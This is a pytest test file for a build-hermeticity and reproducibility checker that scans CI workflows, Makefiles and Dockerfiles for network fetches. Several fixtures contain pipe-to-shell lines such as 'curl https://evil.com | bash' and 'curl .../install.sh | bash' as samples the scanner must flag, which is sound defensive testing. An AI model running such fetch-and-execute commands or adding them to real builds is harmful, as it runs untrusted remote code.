"""Tests for reproducibility sieve handlers."""

from pathlib import Path

import pytest

from darnit.sieve.handler_registry import HandlerContext, HandlerResultStatus
from darnit_reproducibility.handlers import (
    _detect_strong_hermeticity_signal,
    _iter_build_files,
    _iter_composite_action_files,
    _iter_container_files,
    _iter_other_ci_files,
    _iter_workflow_files,
    _maybe_check_witness_attestation,
    _scan_line,
    _strip_comment,
    repro_bit_for_bit_handler,
    repro_build_env_declared_handler,
    repro_deps_pinned_handler,
    repro_hermetic_build_handler,
    repro_provenance_exists_handler,
)
from darnit_reproducibility.witness_attestation import WitnessCheckResult

# _detect_strong_hermeticity_signal and repro_hermetic_build_handler both call
# check_witness_attestation(), which shells out to `gh` and the network. Tests
# that aren't specifically exercising that path stub it out to a no-op result;
# witness-specific tests override it again with monkeypatch.setattr.
NO_WITNESS_EVIDENCE = WitnessCheckResult(attempted=False)


@pytest.fixture(autouse=True)
def _stub_witness_attestation(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        "darnit_reproducibility.handlers.check_witness_attestation",
        lambda ctx: NO_WITNESS_EVIDENCE,
    )


def make_ctx(tmp_path: Path, dependency_results: dict[str, str] | None = None) -> HandlerContext:
    return HandlerContext(
        local_path=str(tmp_path),
        owner="org",
        repo="repo",
        default_branch="main",
        control_id="RE-01.01",
        project_context={},
        gathered_evidence={},
        shared_cache={},
        dependency_results=dependency_results if dependency_results is not None else {},
    )


class TestStripComment:
    """Unit tests for the _strip_comment helper."""

    def test_full_comment_line_returns_empty(self) -> None:
        assert _strip_comment("# pip install requests") == ""

    def test_indented_comment_line_returns_empty(self) -> None:
        assert _strip_comment("  # - run: curl https://evil.com") == ""

    def test_inline_comment_is_stripped(self) -> None:
        result = _strip_comment("run: uv sync # install deps")
        assert result == "run: uv sync"
        assert "curl" not in result

    def test_inline_suspicious_comment_is_stripped(self) -> None:
        result = _strip_comment("run: uv sync # pip install requests")
        assert "pip install" not in result

    def test_line_without_comment_unchanged(self) -> None:
        assert _strip_comment("run: uv sync") == "run: uv sync"

    def test_hash_in_url_is_preserved(self) -> None:
        # A '#' not preceded by a space is not treated as a comment
        result = _strip_comment("run: curl https://example.com/file#anchor")
        assert "curl" in result


class TestScanLine:
    """Unit tests for the _scan_line classifier."""

    def test_violation_flagged(self) -> None:
        _, kind = _scan_line("  - run: pip install requests")
        assert kind == "violation"

    def test_safe_pattern_not_flagged(self) -> None:
        _, kind = _scan_line("  - run: npm ci")
        assert kind == "safe"

    def test_safe_overrides_suspicious(self) -> None:
        # pip install --no-index contains 'pip install ' but is safe
        _, kind = _scan_line("pip install --no-index -f /wheels -r requirements.txt")
        assert kind == "safe"

    def test_comment_line_is_safe(self) -> None:
        _, kind = _scan_line("# - run: curl https://evil.com | bash")
        assert kind == "safe"

    def test_empty_line_is_safe(self) -> None:
        _, kind = _scan_line("   ")
        assert kind == "safe"

    def test_dockerfile_apt_get_is_deferred(self) -> None:
        pattern, kind = _scan_line("RUN apt-get install -y build-essential", is_dockerfile=True)
        assert kind == "deferred"
        assert pattern == "apt-get install"

    def test_dockerfile_curl_is_still_violation(self) -> None:
        # curl inside a Dockerfile is not a system package — still a violation
        _, kind = _scan_line("RUN curl https://example.com/install.sh | bash", is_dockerfile=True)
        assert kind == "violation"

    def test_apt_get_outside_dockerfile_is_violation(self) -> None:
        # apt-get install in a workflow step is a live network fetch
        _, kind = _scan_line("  - run: apt-get install -y curl", is_dockerfile=False)
        assert kind == "violation"

    def test_pnpm_frozen_lockfile_is_safe(self) -> None:
        _, kind = _scan_line("run: pnpm install --frozen-lockfile")
        assert kind == "safe"

    def test_returns_matched_pattern(self) -> None:
        pattern, kind = _scan_line("run: wget https://example.com/tool.tar.gz")
        assert kind == "violation"
        assert pattern == "wget"


class TestFileCollectors:
    """Unit tests for the _iter_* file-discovery helpers."""

    def test_workflow_files_found(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("")
        (wf_dir / "release.yaml").write_text("")
        result = _iter_workflow_files(tmp_path)
        assert len(result) == 2

    def test_workflow_files_missing_dir(self, tmp_path: Path) -> None:
        assert _iter_workflow_files(tmp_path) == []

    def test_composite_action_files_found(self, tmp_path: Path) -> None:
        action_dir = tmp_path / ".github" / "actions" / "setup"
        action_dir.mkdir(parents=True)
        (action_dir / "action.yml").write_text("")
        result = _iter_composite_action_files(tmp_path)
        assert len(result) == 1
        assert result[0].name == "action.yml"

    def test_composite_action_files_missing_dir(self, tmp_path: Path) -> None:
        assert _iter_composite_action_files(tmp_path) == []

    def test_other_ci_gitlab(self, tmp_path: Path) -> None:
        (tmp_path / ".gitlab-ci.yml").write_text("")
        result = _iter_other_ci_files(tmp_path)
        assert any(f.name == ".gitlab-ci.yml" for f in result)

    def test_other_ci_circleci(self, tmp_path: Path) -> None:
        circleci = tmp_path / ".circleci"
        circleci.mkdir()
        (circleci / "config.yml").write_text("")
        result = _iter_other_ci_files(tmp_path)
        assert any("config.yml" in str(f) for f in result)

    def test_other_ci_none_present(self, tmp_path: Path) -> None:
        assert _iter_other_ci_files(tmp_path) == []

    def test_build_files_root_makefile(self, tmp_path: Path) -> None:
        (tmp_path / "Makefile").write_text("")
        result = _iter_build_files(tmp_path)
        assert any(f.name == "Makefile" for f in result)

    def test_build_files_nested_makefile(self, tmp_path: Path) -> None:
        sub = tmp_path / "cmd" / "server"
        sub.mkdir(parents=True)
        (sub / "Makefile").write_text("")
        result = _iter_build_files(tmp_path)
        assert any(f.name == "Makefile" for f in result)

    def test_build_files_skips_vendor(self, tmp_path: Path) -> None:
        vendor = tmp_path / "vendor" / "pkg"
        vendor.mkdir(parents=True)
        (vendor / "Makefile").write_text("")
        result = _iter_build_files(tmp_path)
        assert not any("vendor" in str(f) for f in result)

    def test_build_files_scripts_dir(self, tmp_path: Path) -> None:
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "build.sh").write_text("")
        (scripts / "install-deps.sh").write_text("")
        result = _iter_build_files(tmp_path)
        names = [f.name for f in result]
        assert "build.sh" in names
        assert "install-deps.sh" in names

    def test_container_files_root_dockerfile(self, tmp_path: Path) -> None:
        (tmp_path / "Dockerfile").write_text("")
        result = _iter_container_files(tmp_path)
        assert any(f.name == "Dockerfile" for f in result)

    def test_container_files_subdir(self, tmp_path: Path) -> None:
        docker_dir = tmp_path / "docker"
        docker_dir.mkdir()
        (docker_dir / "Dockerfile.prod").write_text("")
        result = _iter_container_files(tmp_path)
        assert any(f.name == "Dockerfile.prod" for f in result)

    def test_container_files_none_present(self, tmp_path: Path) -> None:
        assert _iter_container_files(tmp_path) == []


class TestDetectStrongSignal:
    """Unit tests for _detect_strong_hermeticity_signal.

    ``check_witness_attestation`` is stubbed to a no-op by the module-level
    ``_stub_witness_attestation`` fixture unless a test overrides it below.
    """

    def test_returns_none_with_no_signals(self, tmp_path: Path) -> None:
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [], {}, make_ctx(tmp_path), {})
        assert signal is None

    def test_witness_mention_alone_is_not_a_signal(self, tmp_path: Path) -> None:
        # Merely mentioning "witness run" in CI text proves the tool ran, not
        # what it observed — only a verified attestation with a clean network
        # log counts now (see test_verified_witness_attestation_is_a_signal).
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: witness run -- make build\n")
        signal, witness_result = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is None
        assert witness_result.verified is False

    def test_verified_witness_attestation_is_a_signal(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        verified = WitnessCheckResult(
            attempted=True,
            verified=True,
            network_clean=True,
            detail="runtime-trace predicate recorded an empty network log",
        )
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        signal, witness_result = _detect_strong_hermeticity_signal(tmp_path, [], {}, make_ctx(tmp_path), {})
        assert signal is not None
        assert "Witness" in signal
        assert witness_result is verified

    def test_verified_witness_attestation_with_network_activity_is_not_a_pass_signal(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        dirty = WitnessCheckResult(
            attempted=True,
            verified=True,
            network_clean=False,
            detail="runtime-trace predicate recorded 2 network event(s)",
        )
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: dirty)
        signal, witness_result = _detect_strong_hermeticity_signal(tmp_path, [], {}, make_ctx(tmp_path), {})
        assert signal is None
        assert witness_result.network_clean is False

    def test_witness_check_disabled_via_config(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        verified = WitnessCheckResult(attempted=True, verified=True, network_clean=True, detail="clean")
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        signal, witness_result = _detect_strong_hermeticity_signal(
            tmp_path, [], {}, make_ctx(tmp_path), {"verify_witness_attestations": False}
        )
        # The mocked check_witness_attestation returns a verified/clean result,
        # but the config toggle must prevent it from ever being called.
        assert signal is None
        assert witness_result.attempted is False
        assert "disabled via config" in witness_result.detail

    def test_nix_flake_with_nix_build_in_ci(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: nix build .#default\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "PASS"}, make_ctx(tmp_path, {"RE-01.02": "PASS"}), {}
        )
        assert signal is not None
        assert "Nix" in signal

    def test_nix_flake_present_but_no_ci_usage(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: uv sync\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "PASS"}, make_ctx(tmp_path, {"RE-01.02": "PASS"}), {}
        )
        assert signal is None

    def test_nix_flake_not_gated_without_build_env_declared_pass(self, tmp_path: Path) -> None:
        # flake.nix + CI usage looks right, but RE-01.02 (BuildEnvDeclared) never
        # ran or didn't PASS — withhold the signal rather than assume.
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: nix build .#default\n")
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is None

    def test_nix_flake_not_gated_when_build_env_declared_failed(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: nix build .#default\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "FAIL"}, make_ctx(tmp_path, {"RE-01.02": "FAIL"}), {}
        )
        assert signal is None

    def test_bazel_with_network_sandbox_flag(self, tmp_path: Path) -> None:
        (tmp_path / "MODULE.bazel").write_text("module(name = 'myproject')")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: bazel build //... --sandbox_default_allow_network=false\n")
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is not None
        assert "Bazel" in signal

    def test_bazel_workspace_without_sandbox_flag(self, tmp_path: Path) -> None:
        # Bazel allows network by default — workspace alone is not enough
        (tmp_path / "WORKSPACE").write_text("")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: bazel build //...\n")
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is None

    def test_witness_takes_priority_over_nix(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        # No CI file mentions "witness" at all here — the point of this test
        # is that a verified attestation still wins even though there is no
        # text-based hint that Witness is in use (e.g. it ran via a reusable
        # workflow the caller's own CI files never name).
        verified = WitnessCheckResult(attempted=True, verified=True, network_clean=True, detail="clean")
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: nix build .#default\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "PASS"}, make_ctx(tmp_path, {"RE-01.02": "PASS"}), {}
        )
        assert signal is not None
        assert "Witness" in signal

    def test_commented_nix_reference_is_not_a_signal(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("# TODO: nix build .#default someday\nsteps:\n  - run: uv sync\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "PASS"}, make_ctx(tmp_path, {"RE-01.02": "PASS"}), {}
        )
        assert signal is None

    def test_commented_bazel_sandbox_flag_is_not_a_signal(self, tmp_path: Path) -> None:
        (tmp_path / "MODULE.bazel").write_text("module(name = 'myproject')")
        wf = tmp_path / "ci.yml"
        wf.write_text(
            "steps:\n"
            "  # TODO: bazel build //... --sandbox_default_allow_network=false\n"
            "  - run: bazel build //...\n"
        )
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is None


class TestMaybeCheckWitnessAttestation:
    """Unit tests for the config-toggle wrapper around check_witness_attestation()."""

    def test_disabled_via_config_short_circuits(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        called = False

        def spy(ctx: HandlerContext) -> WitnessCheckResult:
            nonlocal called
            called = True
            return WitnessCheckResult(attempted=True, verified=True, network_clean=True)

        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", spy)
        result = _maybe_check_witness_attestation(make_ctx(tmp_path), {"verify_witness_attestations": False})
        assert called is False
        assert result.attempted is False

    def test_enabled_by_default(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        expected = WitnessCheckResult(attempted=True, verified=True, network_clean=True)
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: expected)
        result = _maybe_check_witness_attestation(make_ctx(tmp_path), {})
        assert result is expected

    def test_explicitly_enabled_via_config(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        expected = WitnessCheckResult(attempted=True, verified=True, network_clean=True)
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: expected)
        result = _maybe_check_witness_attestation(make_ctx(tmp_path), {"verify_witness_attestations": True})
        assert result is expected


class TestRepoDepsPin:
    """Tests for repro_deps_pinned_handler()."""

    def test_pass_with_uv_lock(self, tmp_path: Path) -> None:
        (tmp_path / "uv.lock").write_text("lock content")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS
        assert "uv.lock" in result.message

    def test_pass_with_cargo_lock(self, tmp_path: Path) -> None:
        (tmp_path / "Cargo.lock").write_text("lock")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_pass_with_package_lock_json(self, tmp_path: Path) -> None:
        (tmp_path / "package-lock.json").write_text("{}")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_fail_with_only_loose_manifest(self, tmp_path: Path) -> None:
        (tmp_path / "requirements.txt").write_text("requests>=2.0")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_inconclusive_with_no_deps(self, tmp_path: Path) -> None:
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_lock_and_loose_both_present_passes(self, tmp_path: Path) -> None:
        """A lock file takes precedence over a loose manifest -> PASS."""
        (tmp_path / "uv.lock").write_text("lock content")
        (tmp_path / "requirements.txt").write_text("requests>=2.0")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS


class TestBuildEnvDeclared:
    """Tests for repro_build_env_declared_handler()."""

    def test_pass_with_dockerfile(self, tmp_path: Path) -> None:
        (tmp_path / "Dockerfile").write_text("FROM python:3.11")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_pass_with_nix_flake(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_pass_with_python_version_file(self, tmp_path: Path) -> None:
        (tmp_path / ".python-version").write_text("3.11.0")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_inconclusive_with_nothing(self, tmp_path: Path) -> None:
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_with_devcontainer_dir(self, tmp_path: Path) -> None:
        """.devcontainer is a directory, not a file; it must still be detected."""
        (tmp_path / ".devcontainer").mkdir()
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS


class TestHermeticBuild:
    """Integration tests for repro_hermetic_build_handler()."""

    # ------------------------------------------------------------------
    # No files
    # ------------------------------------------------------------------

    def test_inconclusive_with_no_files(self, tmp_path: Path) -> None:
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE
        assert result.confidence == 0.0

    # ------------------------------------------------------------------
    # Clean grep → INCONCLUSIVE (not PASS — grep absence ≠ hermeticity)
    # ------------------------------------------------------------------

    def test_inconclusive_with_clean_workflow(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: uv sync")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE
        assert result.confidence == 0.4

    def test_inconclusive_editable_install_not_flagged(self, tmp_path: Path) -> None:
        """`pip install -e .` is a local editable install, not a network fetch."""
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: pip install -e .")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    # ------------------------------------------------------------------
    # Violations → FAIL
    # ------------------------------------------------------------------

    def test_fail_with_raw_pip_install(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: pip install requests")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_safe_and_violation_in_same_file(self, tmp_path: Path) -> None:
        """A file with both uv sync and curl should still flag the curl line."""
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: uv sync\n  - run: curl https://example.com | bash\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_violation_in_makefile(self, tmp_path: Path) -> None:
        (tmp_path / "Makefile").write_text("install:\n\tcurl https://example.com/tool.sh | bash\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL
        assert any("Makefile" in v for v in result.evidence["violations_found"])

    def test_fail_violation_in_composite_action(self, tmp_path: Path) -> None:
        action_dir = tmp_path / ".github" / "actions" / "setup"
        action_dir.mkdir(parents=True)
        (action_dir / "action.yml").write_text(
            "runs:\n  using: composite\n  steps:\n    - run: wget https://example.com/tool.tar.gz\n"
        )
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_violation_in_gitlab_ci(self, tmp_path: Path) -> None:
        (tmp_path / ".gitlab-ci.yml").write_text("build:\n  script:\n    - pip install requests\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_violation_in_circleci(self, tmp_path: Path) -> None:
        circleci = tmp_path / ".circleci"
        circleci.mkdir()
        (circleci / "config.yml").write_text("jobs:\n  build:\n    steps:\n      - run: npm install\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_dockerfile_curl(self, tmp_path: Path) -> None:
        (tmp_path / "Dockerfile").write_text("FROM python:3.12\nRUN curl https://example.com/install.sh | bash\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    # ------------------------------------------------------------------
    # Dockerfile DEFERRED — apt-get is image build context, not a violation
    # ------------------------------------------------------------------

    def test_inconclusive_dockerfile_apt_get_only(self, tmp_path: Path) -> None:
        (tmp_path / "Dockerfile").write_text("FROM python:3.12\nRUN apt-get install -y build-essential\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE
        assert any("apt-get install" in d for d in result.evidence["deferred_found"])

    # ------------------------------------------------------------------
    # Comment stripping
    # ------------------------------------------------------------------

    def test_inconclusive_commented_out_violation(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  # example (do not use): pip install requests\n  - run: uv sync\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_inconclusive_inline_comment_with_violation(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: uv sync # previously: pip install -r requirements.txt\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    # ------------------------------------------------------------------
    # Strong signals → PASS
    # ------------------------------------------------------------------

    def test_witness_mention_alone_does_not_pass(self, tmp_path: Path) -> None:
        # Text-only mention of witness in CI is no longer sufficient for a
        # PASS — see test_pass_verified_witness_attestation below.
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - uses: testifysec/witness-run-action@v0.1\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_verified_witness_attestation(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        verified = WitnessCheckResult(
            attempted=True,
            verified=True,
            network_clean=True,
            detail="runtime-trace predicate recorded an empty network log",
        )
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - uses: testifysec/witness-run-action@v0.1\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS
        assert "Witness" in result.message

    def test_fail_verified_witness_attestation_with_network_activity(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        dirty = WitnessCheckResult(
            attempted=True,
            verified=True,
            network_clean=False,
            detail="runtime-trace predicate recorded 1 network event(s)",
            evidence={"artifact": "witness-attestation.json"},
        )
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: dirty)
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: uv sync\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL
        assert any("witness attestation" in v for v in result.evidence["violations_found"])

    def test_witness_verification_disabled_via_config(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        # Even a mocked verified/clean attestation must not produce a PASS
        # when the pass config opts out of the network round-trip.
        verified = WitnessCheckResult(attempted=True, verified=True, network_clean=True, detail="clean")
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - uses: testifysec/witness-run-action@v0.1\n")
        result = repro_hermetic_build_handler({"verify_witness_attestations": False}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_nix_flake_build_in_ci(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: nix build .#default\n")
        ctx = make_ctx(tmp_path, dependency_results={"RE-01.02": "PASS"})
        result = repro_hermetic_build_handler({}, ctx)
        assert result.status == HandlerResultStatus.PASS
        assert "Nix" in result.message

    def test_inconclusive_nix_flake_without_build_env_declared_pass(self, tmp_path: Path) -> None:
        # Same repo shape as the PASS case above, but RE-01.02 (BuildEnvDeclared)
        # never confirmed flake.nix as the declared build environment — the nix
        # strong signal must be withheld, falling back to the grep heuristic.
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: nix build .#default\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_bazel_with_sandbox_flag(self, tmp_path: Path) -> None:
        (tmp_path / "MODULE.bazel").write_text("module(name = 'myproject')")
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: bazel build //... --sandbox_default_allow_network=false\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS
        assert "Bazel" in result.message


class TestProvenanceExists:
    """Tests for repro_provenance_exists_handler()."""

    def test_inconclusive_with_no_workflows(self, tmp_path: Path) -> None:
        result = repro_provenance_exists_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_with_cosign_in_workflow(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "release.yml").write_text("steps:\n  - uses: sigstore/cosign")
        result = repro_provenance_exists_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_pass_with_slsa_generator(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "release.yml").write_text("steps:\n  - uses: slsa-framework/slsa-github-generator")
        result = repro_provenance_exists_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS


class TestBitForBit:
    """Tests for repro_bit_for_bit_handler()."""

    def test_inconclusive_with_no_workflows(self, tmp_path: Path) -> None:
        result = repro_bit_for_bit_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_with_source_date_epoch(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("env:\n  SOURCE_DATE_EPOCH: 0")
        result = repro_bit_for_bit_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_date_macro_not_flagged(self, tmp_path: Path) -> None:
        """__DATE__ is a C-source macro, not a workflow signal; a workflow-only
        scan must not FAIL on it. With no positive signal present the result is
        INCONCLUSIVE (manual verification), never a false FAIL."""
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: echo __DATE__")
        result = repro_bit_for_bit_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE
